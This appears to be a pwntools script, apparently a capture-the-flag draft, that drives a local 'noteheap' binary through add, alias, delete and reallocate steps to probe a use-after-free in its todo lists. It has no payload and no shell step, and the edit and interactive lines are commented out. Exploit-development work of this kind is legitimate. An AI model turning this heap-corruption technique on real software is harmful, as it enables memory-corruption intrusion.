#!/usr/bin/env python

from pwn import *
import subprocess
import sys
import time

ELF_PATH = "./noteheap"

context.arch = 'i386'
context.os = 'linux'
context.endian = 'little'
context.word_size = 64
context.log_level = 'INFO'

elf = ELF(ELF_PATH)


def alarm_add(alarmName):
	r.sendline("alarm add " + alarmName)

def alarm_list():
	r.sendline("alarm list")

def alarm_del(alarmIndex):
	r.sendline("alarm del " + str(alarmIndex))


def todo_add(listName, todoPrio, todoBody):
	r.sendline("todo add " + listName + " " + str(todoPrio) + " " + todoBody)

def todo_edit(listName, listEntryIndex, todoPrio, todoBody):
	r.sendline("todo edit " + listName + ":" + str(listEntryIndex) + " " + str(todoPrio) + " " + todoBody)


def list_add(dstListName, srcListName, srcListIndex):
	r.sendline("list add " + dstListName + " " + srcListName + ":" + str(srcListIndex))

def list_view(listName):
	r.sendline("list view " + listName)

def list_del(listName, listIndex):
	r.sendline("list del " + listName + ":" + str(listIndex))


if __name__ == "__main__":
		r = process(ELF_PATH)

		todo_add('work', 123, "this is the INITIAL todo entry") # will be work:0
		list_view('work')

		list_add('private', 'work', 0)
		list_view('private')

		list_del('work', 0)
		list_view('private')

		alarm_add("Testalarm")
		alarm_list()

		list_view('private')
		#todo_edit('private', 0, 0xaa, "this is the MODIFIED todo entry")
		list_view('private')

		alarm_list()
		alarm_del(0)

		print r.recv()

		#r.interactive()
